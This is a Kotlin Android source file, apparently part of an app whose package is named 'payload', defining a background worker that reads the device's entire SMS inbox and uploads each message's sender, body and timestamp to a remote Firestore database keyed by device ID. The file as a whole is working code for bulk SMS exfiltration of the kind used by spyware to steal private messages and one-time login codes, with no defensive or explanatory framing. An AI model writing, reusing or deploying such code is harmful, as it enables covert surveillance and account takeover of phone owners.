package com.payload.jansiix0ne.worker

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.payload.jansiix0ne.models.SmsModel
import kotlinx.coroutines.tasks.await
import java.util.Date

class AllSmsUploadWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    private val firestore = FirebaseFirestore.getInstance()

    override suspend fun doWork(): Result {
        return try {
            android.util.Log.d("AllSmsUploadWorker", "Starting SMS upload...")
            
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                android.util.Log.e("AllSmsUploadWorker", "❌ READ_SMS permission not granted")
                return Result.failure()
            }

            val deviceId = getDeviceId()
            android.util.Log.d("AllSmsUploadWorker", "Device ID: $deviceId")
            
            val smsList = readAllSms()
            android.util.Log.d("AllSmsUploadWorker", "Found ${smsList.size} SMS messages")
            
            // Upload all SMS to Firestore
            var uploaded = 0
            smsList.forEach { sms ->
                try {
                    uploadSmsToFirestore(sms, deviceId)
                    uploaded++
                    if (uploaded % 10 == 0) {
                        android.util.Log.d("AllSmsUploadWorker", "Uploaded $uploaded/${smsList.size} SMS...")
                    }
                } catch (e: Exception) {
                    android.util.Log.e("AllSmsUploadWorker", "Failed to upload SMS: ${e.message}")
                }
            }
            
            android.util.Log.d("AllSmsUploadWorker", "✅ Uploaded $uploaded/${smsList.size} SMS successfully!")
            Result.success()
        } catch (e: Exception) {
            android.util.Log.e("AllSmsUploadWorker", "❌ SMS upload failed: ${e.message}", e)
            Result.failure()
        }
    }

    private fun readAllSms(): List<SmsModel> {
        val smsList = mutableListOf<SmsModel>()
        val uri = Uri.parse("content://sms/inbox")
        
        val cursor = applicationContext.contentResolver.query(
            uri,
            arrayOf("address", "body", "date"),
            null,
            null,
            "date DESC"
        )
        
        cursor?.use {
            val addressIndex = it.getColumnIndex("address")
            val bodyIndex = it.getColumnIndex("body")
            val dateIndex = it.getColumnIndex("date")
            
            while (it.moveToNext()) {
                val address = it.getString(addressIndex)
                val body = it.getString(bodyIndex)
                val date = it.getLong(dateIndex)
                
                smsList.add(
                    SmsModel(
                        from = address,
                        message = body,
                        time = Timestamp(Date(date)),
                        ownerDeviceId = getDeviceId()
                    )
                )
            }
        }
        
        return smsList
    }

    private suspend fun uploadSmsToFirestore(smsModel: SmsModel, deviceId: String) {
        firestore.collection("devices")
            .document(deviceId)
            .collection("sms")
            .add(smsModel)
            .await()
    }

    private fun getDeviceId(): String {
        val prefs = applicationContext.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
        return prefs.getString("device_id", "") ?: ""
    }
}
